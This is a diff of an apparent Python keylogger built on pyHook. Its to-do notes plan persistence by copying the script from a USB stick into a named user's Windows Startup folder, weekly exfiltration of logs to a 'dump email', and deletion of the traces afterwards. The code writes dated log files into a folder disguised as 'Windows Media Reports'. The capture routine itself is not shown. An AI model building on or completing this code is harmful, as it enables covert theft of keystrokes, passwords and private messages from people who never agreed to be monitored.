@@ -1,25 +1,28 @@
-# bugs and to do 
-#   all letters are caplitlized 
-#   numbers are mixed with the words
-#   how to start up the file on startup
-#   make 
-#   C:\Users\Henry\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-#   get user's name 
-#   
-#   create a bash file to move this file to the startup file 
-#   send all files at the end of the week and delete everything 
+"""
+								Note
+- C:\\Users\\Henry\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
 
+								To Do
+- Create a bash or python script that moves the files from usb to startup folder
+- Send file to dump email
+- 
+
+								Bugs 
+- All letters are caplitlized
+- Numbers are mixed in where characters should be
+
+"""
 
 import pyHook, pythoncom, os
 from datetime import datetime
 # get user's name so we can go to the directory
 from pathlib import Path
 
-# where to create new folder 
-newFolderDir = home + '\\Document\\Windows Media Reports\\' 
-
 # get's the current user's home directory 
 home = str(Path.home())
+
+# where to create new folder 
+newFolderDir = home + '\\Document\\Windows Media Reports\\' 
 
 todays_date = datetime.now().strftime('%Y-%b-%d')
 file_name = home + '\\Document\\Windows Media Reports\\' + todays_date + '.txt'
